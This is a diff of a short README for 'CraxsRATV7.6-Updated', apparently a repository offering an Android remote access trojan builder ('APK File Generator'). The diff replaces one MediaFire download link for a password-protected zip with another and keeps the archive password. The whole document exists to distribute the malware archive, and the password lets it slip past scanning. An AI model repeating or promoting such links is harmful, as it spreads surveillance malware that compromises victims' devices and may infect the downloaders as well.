@@ -1,7 +1,6 @@
 # CraxsRATV7.6-Updated
 
-[Click Here To Download](https://www.mediafire.com/file/x8dd8ud5bludi5w/CraxsRat7.6.zip/file)
-[Pass : W4h8dc0u./$$]
+# 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://www.mediafire.com/file/jxqwwzjwo7bm03f/CraxsRat7.6.zip/file)     [Pass : W4h8dc0u./$$]
 
 
 APK File Generator
